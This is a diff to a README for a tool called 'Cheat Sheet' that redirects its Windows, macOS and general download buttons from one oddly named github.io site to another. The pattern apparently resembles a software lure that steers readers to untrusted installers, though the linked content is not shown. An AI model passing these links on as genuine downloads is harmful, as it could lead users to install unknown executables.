@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Cheat Sheet](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_CHEAT_SHEET-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download Cheat Sheet](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_CHEAT_SHEET-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Cheat Sheet** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FF9800?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FF9800?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FF9800?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FF9800?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
